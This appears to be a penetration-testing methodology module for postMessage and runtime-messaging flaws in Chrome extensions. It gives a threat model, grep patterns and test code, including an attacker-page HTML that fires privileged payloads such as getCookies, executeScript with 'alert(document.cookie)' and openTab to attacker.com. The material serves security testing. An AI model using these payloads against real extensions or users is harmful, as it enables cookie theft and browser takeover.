# VULN MODULE — postMessage (Chrome Extension variant)
# Asset: chromeext
# See also: asset/webapp/vuln/postmessage.md for web app variant
# Report ID prefix: EXT-PM

## THREAT MODEL (Extension-specific)

Extensions have THREE message channels, each with different trust:

  1. window.postMessage
     Web page ↔ content script (same window object)
     Attacker: ANY website the victim visits

  2. chrome.runtime.sendMessage / runtime.onMessage
     Content script ↔ background service worker
     Attacker: malicious web page → content script → background escalation

  3. chrome.runtime.onMessageExternal
     Other extensions → this extension
     Attacker: malicious extension installed on same browser

The most dangerous path:
  Attacker web page
    → postMessage to content script (no restriction)
    → content script forwards to background (if not validated)
    → background executes privileged chrome API (tabs, cookies, scripting)

## WHITEBOX STATIC ANALYSIS

```bash
# Content script message listeners (postMessage from page)
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js"
grep -rn "event\.origin\b" --include="*.js"
# Flag: listener exists BUT event.origin is NOT checked

# Background message handlers
grep -rn "runtime\.onMessage\.addListener\|runtime\.onMessage\.addListener" --include="*.js"
grep -rn "sender\.origin\|sender\.url\|sender\.tab" --include="*.js"
# Flag: background handler processes messages WITHOUT checking sender

# External message handler (other extensions)
grep -rn "onMessageExternal\|onConnectExternal" --include="*.js"

# Privileged API calls reachable from message handlers
grep -rn "chrome\.tabs\.\|chrome\.scripting\.\|chrome\.cookies\.\|chrome\.history\." --include="*.js"
# Trace: which of these are called inside a message handler?

# postMessage sends — does extension leak data to page?
grep -rn "window\.postMessage\|parent\.postMessage\|top\.postMessage" --include="*.js"
# Check: is sensitive data (tokens, URLs, browsing history) sent with wildcard origin?
```

## BLACKBOX TESTING

### Step 1 — Map extension message types
```javascript
// Inject into a page where the extension's content script is active
// Intercept outgoing postMessage calls from content script to page
const origPostMessage = window.postMessage.bind(window);
window.postMessage = function(data, origin, transfer) {
  console.log('[EXT→PAGE postMessage]', { data, origin });
  return origPostMessage(data, origin, transfer);
};

// Also intercept incoming
window.addEventListener('message', (e) => {
  console.log('[MESSAGE EVENT]', { origin: e.origin, data: e.data });
}, true); // capture phase
```

### Step 2 — Privilege escalation test
```html
<!-- Served from attacker.com — extension content script is injected here -->
<!DOCTYPE html>
<html>
<body>
<script>
// Step 1: send postMessage to content script
// Use message types discovered from static analysis / interception
const types = [
  { type: 'openTab', url: 'https://attacker.com/stolen' },
  { type: 'getSettings' },
  { type: 'getCookies', domain: '.target.com' },
  { action: 'executeScript', code: 'alert(document.cookie)' },
  { msgName: 'setConfig', value: '{"debug":true}' }
];

types.forEach(payload => {
  window.postMessage(payload, '*');
  window.postMessage(JSON.stringify(payload), '*');
});

// Step 2: monitor for responses that indicate privileged action triggered
window.addEventListener('message', (e) => {
  if (e.origin.startsWith('chrome-extension://')) {
    console.log('[EXTENSION RESPONSE]', e.data);
  }
});
</script>
</body>
</html>
```

### Step 3 — External extension messaging
```javascript
// From another extension (attacker controlled)
// Get target extension ID from Chrome Web Store URL or chrome://extensions
const TARGET_EXT_ID = 'bkbkchdfpdlohdoebapnp'; // DDG example

chrome.runtime.sendMessage(TARGET_EXT_ID,
  { type: 'getPrivateData', action: 'exportSettings' },
  (response) => console.log('[External msg response]', response)
);
```

### Step 4 — Sensitive data in postMessage sends
```javascript
// Monitor all postMessages sent by extension to page
// Inject via Tampermonkey or proxy-injected script
const origAddEventListener = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, handler, ...args) {
  if (type === 'message' && this === window) {
    const wrapped = (e) => {
      if (e.source !== window) { // from extension iframe or content script
        console.log('[EXT postMessage to page]', {
          origin: e.origin, data: e.data
        });
      }
      return handler.call(this, e);
    };
    return origAddEventListener.call(this, type, wrapped, ...args);
  }
  return origAddEventListener.call(this, type, handler, ...args);
};
```

## IMPACT ESCALATION

Missing origin check in content script:
  → attacker web page can trigger content script behavior
  → severity depends on what the content script CAN be made to do

Content script forwards unvalidated to background:
  → attacker can call ANY chrome API the extension has permission for
  → with <all_urls> + cookies + scripting → Critical (full browser takeover)

Extension sends cookies/tokens with wildcard:
  → attacker page receives sensitive data passively
  → High (credential theft without any user interaction beyond page visit)
